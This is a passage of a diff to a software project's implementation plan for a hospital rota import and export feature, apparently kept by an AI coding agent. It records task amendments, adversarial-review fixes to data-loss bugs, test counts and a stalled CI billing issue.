+task text says to add `'eligib'`, `'on_call'`, `'onCall'` and `'callRoster'` to the existing scan.
+`grep -rniE "eligib|on_call|onCall|callRoster" app/Support/Rota/` returns three hits before a line
+of this task is written — `AvailabilitySummary`'s *"THIS IS NOT, AND MUST NEVER BECOME, AN ON-CALL
+ELIGIBILITY COMPUTATION"*, the same file's *"the rota had quietly begun inferring eligibility"*, and
+`RotaFill`'s *"THIS IS NOT AN ON-CALL ELIGIBILITY COMPUTATION"*. `CalendarIsTheOnlyConverterTest`'s
+remedy for the same collision (finding 14: write around the call shape in prose) is unavailable
+here, because the prose IS the rule and rewording it to dodge a substring would be absurd. So the
+new scan **strips comments before matching** — PHP through `token_get_all()`, `.vue` through three
+conservative patterns — and a guard that punished the documentation of the rule it enforces became
+a guard that reads only code. Two consequences worth stating: the match is now **case-insensitive**
+(safe only because comments are gone, and it is the difference between catching `off_roster` alone
+and also catching `isEligibleForCall()`), and the stripper itself needs a test, so
+`test_the_scan_strips_comments_and_still_sees_the_code` pins both ends against real files — the
+prose is gone, the code is not. A stripper that over-reached would disable the whole guard and look
+identical to a clean tree. The original four-needle scan over the whole of `app/` is UNCHANGED and
+kept beside the new one: the two fail for different reasons and neither subsumes the other.
+
+**Task 12 (2026-08-10) — three MR-04 probes, and the third is the one that justifies the
+departure.** (1) `private static function isEligibleForCall()` planted in `RotaImport` →
+*"app/Support/Rota/RotaImport.php: eligib"*, which is also the case-insensitivity earning its
+place, since `eligib` as a fixed-case needle would have missed `isEligibleForCall` entirely.
+(2) `const onCallRoster = []` planted in `RotaImport.vue` → two needles red on the screen file.
+(3) The **same words in a comment** (`/** … never infers on_call eligibility. */`) → still GREEN,
+which is the property the stripper exists for. All three reverted.
+
+**Task 12 (2026-08-10) — the stale digest cannot be reached from the screen, and that is the
+screen working rather than a gap in the journey.** The task's "failing test to write first" asks
+the e2e to *"upload a changed file against the previous digest and assert the 422 message"*. The
+screen invalidates its analysis client-side the moment the file or the kind changes (`previewedKey`
+/`currentKey`, `RosterImport.vue`'s discipline), so the commit control is simply not offered
+against a file the server has not answered for — there is no browser gesture that posts file B
+under file A's digest. Re-writing the file on disk between the choice and the commit was rejected
+as a route to it: Chromium snapshots a `File` by path+size+mtime and a modified file fails the read
+with a network-level error rather than a 422, which would assert nothing about this feature.
+The refusal is therefore proved where it is reachable: server-side in
+`RotaImportScreenTest::test_a_file_changed_since_the_preview_is_refused_on_the_file_field` (a
+different file's bytes carrying the previous digest → errors on `file`, zero rows, zero audit
+rows), and client-side in `RotaImport.test.js` (given that 422, the screen shows the server's
+sentence, DROPS the analysis, and re-runs the PREVIEW — never the commit). The Vitest case was
+proved falsifiable by pointing the stale handler back at `commit()`: *"expected
+'/admin/rota/import/commit' to be '/admin/rota/import/preview'"*.
+
+**Task 12 (2026-08-10) — THE JOURNEY'S OWN FINAL ASSERTION COULD NOT DETECT WHAT IT NAMED, and
+planting the defect is what showed it.** The destructive half previews a file that would overwrite
+`ereader`'s deliberate Block 1 gap, deliberately does NOT confirm it, and then re-reads the rota
+from the server. That last step originally read `await expect(untouched).not.toContainText('NICU')`.
+It is worthless: an overwritten cell stops being a split and renders a plain unit `<select>` whose
+options list every unit in the department, so "NICU is not in this cell" is true of a split cell and
+false of an empty one, for reasons that have nothing to do with the import. Caught by planting
+`RotaImportController::preview()` calling `RotaImport::commit()` — the whole point of the e2e half,
+a dry run that writes — and reading which assertion fired. It now asserts the cell is still a split:
+`li.channel-bar` count 1, PICU, `2026-08-07`, `7d unassigned`, and the whole cell's `innerText`
+unchanged. Re-probed after the change: **red at `toHaveCount(1)`, received 0**, green on revert.
+
+**Task 12 (2026-08-10) — the destructive half is previewed and never committed, and that is a
+FIXTURE CONTRACT as well as the requirement.** `rota-read.spec.js` runs after this file against the
+same sqlite database and asserts E2eSeeder's exact coverage arithmetic (21 assigned days, 35 not
+assigned, one person with a gap, two unassigned). Committing the overwrite here would fail that
+spec for a reason nobody reading it could diagnose. The no-op round trip in the first half is safe
+for exactly the reason it is worth asserting: `applied === 0`, so it writes nothing at all. Both
+properties are stated in the spec's own docblock so a later edit cannot quietly commit the second
+half.
+
+**Task 12 (2026-08-10) — a handle-only preview-row locator is a strict-mode violation by
+construction.** The first shape of the spec's `previewRow()` filtered on the short name alone and
+resolved to TWO elements: the unit of outcome is the (person, period) CELL, so anybody planned
+across a year has one preview row per block. It now filters on the handle AND the block label, with
+`toHaveCount(1)` asserted before anything is read off it. Worth recording because the same trap is
+NOT finding 15's (mobile card versus desktop row) — it is the importer's own cell shape, and no
+existing rota spec demonstrates it.
+
+**Task 12 (2026-08-10) — the screen needed an affordance the task's file list does not mention,
+and P1d-1's journey is why it was added rather than assumed.** `routes/web.php` gaining
+`/admin/rota/import` makes the screen exist; nothing made it REACHABLE. An "Import a file…" control
+now sits in `MasterRota.vue`'s export section, beside the two files it reads back — an Inertia
+`<Link>`, not a plain `<a>` like the two exports beside it, because those are downloads and this is
+an ordinary page. `MasterRota.vue` gains `Link` to its `@inertiajs/vue3` import; all seven Vitest
+files that mount it already stub `Link`, checked before the edit rather than after.
+
+**Task 12 (2026-08-10) — `HandleInertiaRequests::share()` joins this task's file list too, for the
+third time in this slice.** Task 9's amendment records the mechanism (a session key no `share()`
+names is invisible to every page, with all four suites green); the lesson was applied here BEFORE
+the screen was written rather than discovered again, and
+`RotaImportScreenTest::test_the_preview_writes_nothing_and_reaches_the_screen_as_a_shared_prop`
+asserts it through a real second request, `->missing('flash.rota_import_preview.context')` included.
+
+**Task 12 (2026-08-10) — finding 9's `post_max_size` detection became a trait rather than a second
+copy.** `RotaImportRequest` needs the same "empty `$_POST` past the upload limit" detection
+`RosterImportRequest` carries, and that detection has an ordering constraint found EMPIRICALLY
+(detect before the request's own `merge()`, or the guard is silently disabled) which is invisible
+from the call site. A hand-written second copy would have been a second chance to get it backwards,
+so it is now `App\Http\Requests\Concerns\DetectsOversizedUpload`, with the ordering rule in the
+trait's own docblock and `RosterImportRequest` re-pointed at it.
+`RosterImportTest::test_an_oversized_upload_reports_the_size_not_a_missing_field` is what proves the
+extraction did not change the behaviour it moved.
+
+**Task 12 (2026-08-10) — `preserveState` is NOT what makes the upload survive its own preview, and
+that was measured rather than assumed.** The screen posts a file, gets a `back()` redirect, and then
+posts the SAME file again on the commit — which only works if the component instance (and with it
+the `<input type="file">`) survives the round trip. Inertia documents `preserveState` as defaulting
+to **false** for POST, so `RotaImport.vue` sets it explicitly; `RosterImport.vue` (P1c) does not,
+which looked like a latent defect worth chasing. It is not: the flag was REMOVED and the Playwright
+journey re-run, and it still passed — a redirect back to the same component reuses the instance in
+Inertia 3. Recorded here, and at the call site, for two reasons: nobody should "fix" the roster
+screen on the strength of the documented default, and nobody should delete the flag here on the
+strength of this measurement, because the flow would then depend on behaviour the default does not
+promise.
+
+**Task 12 (2026-08-10) — counts, MEASURED after this task's own arithmetic was wrong by one.**
+`php artisan test` 1266 → **1281** (thirteen in the new `RotaImportScreenTest`, **two** in
+`RotaAccessTest` — the namespace scan and its stripper calibration; this paragraph first said three,
+which is the fifth instance of stale expected-test-count arithmetic across P1c/P1d and the reason
+the standing rules say to trust the measurement). `npm test` 173 → **185** (twelve in the new
+`tests/js/RotaImport.test.js`). `npm run test:e2e` 21 → **22** (one journey in the new
+`tests/e2e/rota-import.spec.js`). `npm run build` green.
+
+**Task 13 (2026-08-10) — THE TASK'S OWN ITEM 3 IS FALSE AGAINST THE TREE: `Calendar::weeksIn()`
+did NOT gain a second consumer.** The instruction says to record in design §7 that
+*"`Calendar::weeksIn()` gained its second consumer (`AvailabilitySummary`)"*. It has exactly **one**
+production caller, `RotaGrid::forYear():171` — verified by `grep -rn "weeksIn(" app/ resources/js/`,
+which returns that call plus three docblocks *describing* it. `AvailabilitySummary` deliberately
+touches `Calendar` not at all: it folds the `weeks` array `RotaGrid` already put in the props and
+decides "is this person on leave in this week" by comparing four `Y-m-d` **strings**, which is its
+own docblock's *"IT HANDLES NO DATES (ST-06). Not one."* Writing the sentence as instructed would
+have added an eighth factual error to a document whose whole problem is factual errors — and a
+reader chasing the claimed second consumer would find nothing. §7 now records the true, stronger
+version: the snapping half of that item **did** land (`VacationBooking::snap()`, one rule, called by
+`book()` and by the importer's preview), and the weeks half is a case of ST-06 holding harder than
+the plan assumed.
+
+**Task 13 (2026-08-10) — THREE of the documents this task was told to correct were ALREADY correct
+on disk, and one of them is the P1d-1 trap repeating exactly.** Checked before editing, per the
+task's own instruction, and left untouched:
+1. **`docs/spec/08-foundation.md`** — Task 1 corrected it, as the task text itself predicts. Its
+   `rota.manage` paragraph already states the Administrator-only default, names the reversal, names
+   the Scheduler-persona reason a department might grant it, and explains the
+   `applied_role_defaults` never-re-assert consequence. Verified, not re-edited.
+2. **`docs/RUNBOOK-DEPLOY.md`'s Access Control note** — Task 1's own amendment records adding it
+   after finding the runbook already asserted the *old* default. Both bullets are on disk and
+   correct. Only the export/import operator section is new here.
+3. **CLAUDE.md's array-shaped query-parameter rule** — already present, added by the adversarial
+   review, and **absent from the copy of CLAUDE.md this task's executing agent was handed**. That is
+   the precise trap the task text warns about (P1d-1 Task 12 found the sidebar/hue wording already
+   correct on disk and stale only in cached context), observed a second time, in the same file, one
+   slice later. It is worth stating as a general rule rather than a coincidence: **in this
+   repository, a document quoted to you is evidence about the past, not about the tree.**
+
+**Task 13 (2026-08-10) — design §9.1 was already right for a reason that made §13 wrong.** §9.1's
+*"while `rota.manage` (editing) defaults Administrator-only"* is on disk and true today — but it was
+written by **P1d-1's** Task 12, describing a default P1d-1 did not ship, and became accurate only
+when P1d-2 Task 1 reversed the seeder. Left standing, with the reversal recorded beneath it. The
+same sentence had been copied into §13's P1d-1 phase entry, where it is straightforwardly false:
+that entry describes what P1d-1 **shipped**, and P1d-1 shipped Administrator *and* Chief Resident.
+Corrected there. A claim that is true of the tree can still be false of the history it is filed
+under, and this document files claims under history.
+
+**Task 13 (2026-08-10) — GITHUB ACTIONS HAS RUN NO JOB AT ALL SINCE 2026-08-08, and the date this
+task was given is a day late.** The instruction says CI "has been failing to start since
+2026-08-09". Measured with `gh run list --workflow=CI` and `gh run view` rather than taken on
+trust: the last run that actually started was `2026-08-07T17:21Z`; every run from
+`2026-08-08T07:45Z` onward ends in 2–4 seconds with *"The job was not started because recent
+account payments have failed or your spending limit needs to be increased"* on **every** job. Two
+consequences, both recorded in `docs/OWNER-CHECKLIST.md` item 11 as an owner action:
+- The `docker-build` job — added on 2026-08-09 by the ops-rehearsal work *specifically* because
+  nothing in CI had ever built the production image, which is how the `ext-intl` vendor-stage
+  blocker reached a Coolify deploy — has **never executed once**. It was blocked by billing the day
+  it was written. The image was verified by running `docker build` on this machine instead.
+- More broadly, **P0a through P1d-2 have had zero CI coverage**. Every slice was verified locally
+  and committed on that evidence, which is the only reason the tree is trustworthy — but "green"
+  has meant "green on one Windows machine" for two days of work, with no Linux run and no
+  pull-request check. Dependabot's own update runs still succeed, so the commit list shows green
+  ticks that say nothing about CI.
+
+**Task 13 (2026-08-10) — the two owner-side items live in `docs/OWNER-CHECKLIST.md`, not only in a
+plan.** That file is this project's register of "things only the owner can hold", and a plan's
+amendment section is read once. Item 11 is the billing block above; item 12 is the `rota.manage`
+un-tick on an already-seeded instance, stated with why there is deliberately no migration and why
+skipping it is a supported choice rather than a mistake. The runbook keeps its own copy of the
+un-tick because that is where a deploying operator looks; the two do not disagree.
+
+**Task 13 (2026-08-10) — counts, all four suites, measured after the document edits.**
+`php artisan test` **1281**, `npm test` **185**, `npm run test:e2e` **22**, `npm run build` green —
+every one identical to Task 12's figures, as a documentation-only task should be. Recorded because
+"nothing changed" is a measurement here, not an assumption: this task edits six documents and one
+of the four suites (`DeploymentInvariantsTest`, `HostScriptsAreInstanceScopedTest`) does read files
+under `docs/`.
+
+### Adversarial slice review (2026-08-10) — six findings, all fixed on `feat/p1d2b-rota-move`
+
+*Six defects the thirteen tasks and their own tests did not catch. Two were data loss. The pattern
+worth carrying forward: **every one of them was a case where a guard existed and did not cover the
+case it was written for**, not a case where nobody thought about the problem.*
+
+**R1 — the importer was pinned to the file's bytes and not to the rota (data loss, twice
+reproduced).** Task 11 gave `RotaImport::commit()` a sha256 over the uploaded bytes and re-derived
+the analysis inside its own transaction. Re-deriving is what makes the byte pin insufficient: the
+commit computes a FRESH answer, so unchanged bytes apply whatever the rota says NOW. A cell
+previewed `UNCHANGED` was committed as `REPLACE` after a colleague split it, taking both spans; and
+a cell previewed `SKIP_UNKNOWN_PERIOD` with `spans: []` and *"generate that academic year first"*
+on screen committed as a `REPLACE` that collapsed a hand-made split — the operator had been shown
+**no proposed content for that cell at all**. Task 8's own amendment had already named this class
+for the fill and closed it there; the importer, in the same slice on the same table, did not get
+it. Fixed by `App\Support\Rota\StatePin` — ONE definition of what a preview-then-confirm commit is
+pinned to, now the single source for both `RotaFill::digest()` and `RotaImport::stateDigest()` —
+plus `StaleRotaStateException`, deliberately NOT a subclass of `StaleImportFileException` because
+"re-export the file" and "look at the rota again" are different instructions and the file is
+byte-identical in the second case. Fourteen existing tests demanded the pin the moment it landed,
+which is why both commit helpers now preview first through the real flow.
+
+**R2 — the import 500ed on a file the export itself writes.** `CsvRosterReader::rows()` is a
+generator, so `MAX_ROWS` throws MID-ITERATION — inside `RotaImport::preview()`/`commit()`, long
+after `readerFromRequest()`'s try/catch has returned. Both routes were an uncaught
+`RuntimeException`. And 2000 was the ROSTER's number: a rota file is one row per SPAN, so 60 people
+across 13 blocks is 780 before a single split. The cap now belongs to the caller
+(`RotaImport::MAX_ROWS`, 20 000) and the refusal names the number that actually applied.
+`commit()` also gained the `InvalidArgumentException|RuntimeException` catch `MasterRotaController::fill()`
+already had. `RosterFormatException`'s docblock had claimed the throw always precedes the first
+row, which is true of the encoding check and cannot be true of the row cap — that sentence is
+exactly how this shipped.
+
+**R3 — both export GETs were missing `->defaults('no_history', true)`.** So `StartSession` stored
+the download URL and the next `back()` — a fill preview, an import preview — redirected into a CSV,
+destroying the preview and writing a phantom `rota_export` audit row. The flag **had no test at all
+in this codebase**, which is how two routes shipped without it; it is now asserted over the whole
+router by return type (`DownloadRoutesSkipHistoryTest`), with the three signature routes asserted
+by name because no return type can find a plain `Response` carrying PNG bytes.
+
+**R4 — `RotaFill::digest()`'s target `current` projection was guarding nothing.** The whole suite
+stayed green with that line deleted. The untested case is a colleague filling in a cell the fill was
+about to `ASSIGN`: the plan says "empty, so I will add", the source has not moved, and the fill
+overwrites deliberate work with nothing on screen having warned about it.
+
+**R5 — two cell keys could resolve to one (person, period), and the second `split()` ate the
+first.** The key was built from raw text and was wrong in both directions at once: `1` and `+1`
+(both `filter_var`-integer 1) made two cells whose overlap was never compared, while folding case
+on the handle put two rows that resolve DIFFERENTLY under one key. **SQLite/MySQL divergence worth
+recording**: `people.short_name` is compared case-insensitively by MySQL's default collation and
+case-sensitively by SQLite, so the handle half behaves differently on the two engines — the id-keyed
+form is correct on both, and the test says so.
+
+**R6 — three e2e count assertions a ten-times-larger number passed.**
+`toContainText('0 to add')` is satisfied by `"10 to add"`. Each count now carries its own testid and
+is read with `toHaveText`; proved by rendering `10` where `0` belonged and watching the new
+assertion fail on `Received: "10"`.
+
+**Counts after the six fixes:** `php artisan test` **1297** (from 1281), `npm test` **187** (from
+185), `npm run test:e2e` **22** (unchanged — R6 tightened three existing assertions rather than
+adding a case), `npm run build` green.
+
+**One thing the review got wrong, and it is worth stating.** R2 asked for a `RosterFormatException`
+catch *and* a general `InvalidArgumentException|RuntimeException` catch as two separate additions.
+`RosterFormatException` extends `RuntimeException`, so one catch serves both; and the general catch
+is, today, **unreachable from any file** — `RotaImport`'s analysis and the writer/model guards agree
+on every rule (empty set, `to < from`, span outside period, self-overlap), which is exactly the
+property `RotaImportTest` and `RotaAssignmentWriterTest` each assert from their own side. The catch
+is still right — "unreachable today" is precisely the state a catch is for — but it is asserted at
+source rather than exercised, and this note is here so a later reader does not go hunting for the
+file that triggers it.
+
 ---
 
 ## Standing rules for every task
@@ -2215,44 +2952,95 @@ git commit -am "docs: what reading, summarising and moving the rota changed"
 
 ## Definition of done — P1d-2b
 
-- [ ] `php artisan test` green, run via **Bash**, after `npm run build`. `npm test` green.
-      `npm run test:e2e` green.
-- [ ] `App\Support\Rota\RotaFill` plans without writing; `plan()` and `apply()` share one
+- [x] `php artisan test` green, run via **Bash**, after `npm run build`. `npm test` green.
+      `npm run test:e2e` green. (Task 13: **1281** / **185** / **22**, build green.)
+- [x] `App\Support\Rota\RotaFill` plans without writing; `plan()` and `apply()` share one
       `analyse()`; `apply()` re-derives inside its own transaction and trusts no client-supplied
-      plan.
-- [ ] A refusal refuses the **whole** operation. Never "412 of 780 applied".
-- [ ] A target cell carrying a split is skipped unless explicitly confirmed, per cell, defaulting
-      to skip.
-- [ ] Fill-across is forwards only; a split source is refused across periods with the reason named;
-      fill-down copies splits verbatim.
-- [ ] Two explicit fill-down actions, never one that guesses.
-- [ ] **One** `rota_fill` audit row per operation, ids and counts only, written after the
+      plan. (Tasks 7–8. `test_plan_writes_nothing` was proved falsifiable by planting a
+      `RotaAssignment::set()` inside `analyse()`'s target loop. Re-derivation alone was not enough —
+      see the Task 8 amendment: the confirm is additionally pinned to a `RotaFill::digest()` over
+      the plan's state projection, so a grid that moved under the operator is a **refusal**, not a
+      silent apply of something they never saw.)
+- [x] A refusal refuses the **whole** operation. Never "412 of 780 applied". (Task 8.
+      `test_a_failure_part_way_through_rolls_the_whole_fill_back` was measured, not asserted:
+      replacing `apply()`'s `DB::transaction()` with a plain closure produced **7 rows where there
+      had been 6**.)
+- [x] A target cell carrying a split is skipped unless explicitly confirmed, per cell, defaulting
+      to skip. (Task 7. The plan never defined "carrying a split" and the narrow reading —
+      `count > 1` — was a live data-loss bug; `RotaFill::isSplit()`/`isWholePeriod()` are the one
+      definition. `UNCHANGED` is decided **before** the split guard, so no confirmation is demanded
+      for a no-op.)
+- [x] Fill-across is forwards only; a split source is refused across periods with the reason named;
+      fill-down copies splits verbatim. (Task 7. `SKIP_SPLIT_SOURCE` keeps no proposal;
+      `SKIP_SPLIT_TARGET` alone does, because it is the one skip the operator is asked to overrule
+      and they cannot choose between two span sets they can only see one of.)
+- [x] Two explicit fill-down actions, never one that guesses. (Task 7. Three shapes, **four** action
+      keys, collected in `RotaFill::OPERATIONS` so `RotaFillRequest` validates against the one list.)
+- [x] **One** `rota_fill` audit row per operation, ids and counts only, written after the
       transaction commits. `rota_fill` is on `AuditAnomalies`' watch list; the five per-cell rota
-      actions are not, and a test asserts both halves.
-- [ ] Export is **two** files, through `App\Support\Csv` only, BOM-first, formula-neutralised, with
-      **no email and no phone** — asserted with `contact_visibility = members`.
-- [ ] A person with no `short_name` is reported before the file is generated.
-- [ ] `RotaImport::preview()`/`commit()` share one `analyse()`; the whole file is validated before
+      actions are not, and a test asserts both halves. (Task 8. "After the transaction" is asserted
+      by transaction DEPTH at the moment of the append, measured against the ambient depth
+      `RefreshDatabase` imposes rather than hard-coded — a row written *inside* would roll back too,
+      so the plan's own "assert no row after a forced failure" could not have told them apart.
+      `AuditAnomaliesTest::test_a_rota_fill_is_reported_as_a_single_occurrence` was watched red
+      before `rota_fill` joined the list. The detail gained `target_period` and `unchanged`, both
+      missing from Decision F's format — see Amendments.)
+- [x] Export is **two** files, through `App\Support\Csv` only, BOM-first, formula-neutralised, with
+      **no email and no phone** — asserted with `contact_visibility = members`. (Task 10. The
+      contact assertion is over the file's BYTES, and the neutralisation is asserted as a ROUND
+      TRIP through `CsvRosterReader` — a formula name and an Arabic name both come back identical.)
+- [x] A person with no `short_name` is reported before the file is generated. (Task 10. Counted
+      over the people who would appear in the file, not the whole roster — see Amendments.)
+- [x] `RotaImport::preview()`/`commit()` share one `analyse()`; the whole file is validated before
       any write; the commit is pinned to the previewed digest; outcomes are `CREATE`/`REPLACE`/
       `SKIP_UNKNOWN_PERSON`/`SKIP_UNKNOWN_UNIT`/`SKIP_UNKNOWN_PERIOD`/`ERROR`, plus
-      `SKIP_DUPLICATE` on the vacations file, with the reason for that addition recorded.
-- [ ] The importer **never** invents a person, a unit or a period, and never rediscovers a retired
-      one.
-- [ ] `week`-granularity vacations snap through `VacationBooking::snap()` — the same code path as
-      the screen — and the preview reports the adjustment.
-- [ ] An exported year re-imports as a no-op, asserted end to end through `CsvRosterReader`.
-- [ ] `app/Support/Rota/RotaImport.php` is in `RosterNeverMintsCredentialsTest::SCANNED_FILES`, and
-      the file contains no persistence call of its own.
-- [ ] Every fixture under `tests/fixtures/rota/` is synthetic and exercises a failure shape: a
+      `SKIP_DUPLICATE` on the vacations file, with the reason for that addition recorded. (Task 11,
+      plus **`UNCHANGED`**, which the plan's list omits and the round trip cannot be written
+      without — see Amendments. The pin lives in `RotaImport`, not the controller, because the
+      plan's own test 4 could not otherwise be written until Task 12: a pin a controller can forget
+      to apply is not a pin.)
+- [x] The importer **never** invents a person, a unit or a period, and never rediscovers a retired
+      one. (Task 11. A cell holding one good span and one on a retired unit is skipped **whole** —
+      applying the half that resolved would silently delete the half that did not.)
+- [x] `week`-granularity vacations snap through `VacationBooking::snap()` — the same code path as
+      the screen — and the preview reports the adjustment. (Task 11. Probe 6 is the one worth
+      re-reading: the round trip stayed **green** under a deliberately broken snap, because an
+      exported week booking is already week-aligned. Only the not-aligned fixture guards it.)
+- [x] An exported year re-imports as a no-op, asserted end to end through `CsvRosterReader`.
+      (Task 11. The outcome set is **four** answers, not the plan's two — a real export carries a
+      stale person's spans and a retired unit's code, both put there deliberately by Task 10 — so
+      the assertion that carries the meaning is `create + replace + error === 0`, `applied === 0`,
+      and an md5 fingerprint of both row sets before and after.)
+- [x] `app/Support/Rota/RotaImport.php` is in `RosterNeverMintsCredentialsTest::SCANNED_FILES`, and
+      the file contains no persistence call of its own. (Task 11. That list carries a bare
+      `->save()` needle as well as the account-minting ones, so adding the file brought both;
+      `User::create(` and `->save()` were each planted in `commit()`'s dispatch loop and watched
+      red.)
+- [x] Every fixture under `tests/fixtures/rota/` is synthetic and exercises a failure shape: a
       person not on the roster, a retired unit, a period from another academic year, a span outside
-      its period, two spans that overlap, Arabic names, and a formula-injection cell.
-- [ ] `RotaWritersAreSingularTest` green with **no** new allow-list entry.
-- [ ] MR-04 is unbuilt and its absence is asserted over `app/Support/Rota/` in full, including the
-      three new classes.
-- [ ] No migration was added in either half.
-- [ ] The documents in Task 13 corrected, each claim verified against the tree before it was
-      written.
-- [ ] [Amendments](#amendments-made-during-execution) records what this plan got wrong.
+      its period, two spans that overlap, Arabic names, and a formula-injection cell. (Task 11,
+      fourteen files, plus two the plan's table does not list — a blank `short_name` and a bad
+      header row. `assignments-retired-unit.csv` carries two rows, because a retired code and a
+      non-existent code are two different operator problems and ship two different messages.)
+- [x] `RotaWritersAreSingularTest` green with **no** new allow-list entry. (Verified at source: the
+      list is still the two writers plus the two factories. A `MasterRotaAssignment::create(`
+      planted in `RotaFill::apply()`'s dispatch loop, and again in `RotaImport::commit()`'s, went
+      red naming the file and the needle both times.)
+- [x] MR-04 is unbuilt and its absence is asserted over `app/Support/Rota/` in full, including the
+      three new classes. (Task 12. Also over the rota's controllers, its form requests and its four
+      Vue screens; case-insensitively, over CODE with comments stripped — see Amendments for why
+      the plan's literal needle list would have failed the build on the docblocks that state the
+      rule, and for the three probes that prove the scan fires.)
+- [x] No migration was added in either half. (Verified rather than assumed:
+      `git diff --name-only 9c8c1cf...HEAD -- database/migrations` is **empty** across both
+      branches. P1e's `2026_08_16_*` allocation stays free.)
+- [x] The documents in Task 13 corrected, each claim verified against the tree before it was
+      written. (`CLAUDE.md`, design §6.3/§7/§9.1/§13/§14, `docs/spec/15-rulings.md`,
+      `docs/RUNBOOK-DEPLOY.md`, `docs/superpowers/plans/2026-08-08-p1-master-rota.md`, and
+      `docs/OWNER-CHECKLIST.md` for the two owner-side items. `docs/spec/08-foundation.md` and two
+      further passages were checked and found **already correct** — see Amendments, including the
+      one claim in this task's own instructions that turned out false against the tree.)
+- [x] [Amendments](#amendments-made-during-execution) records what this plan got wrong.
 
 ---
 
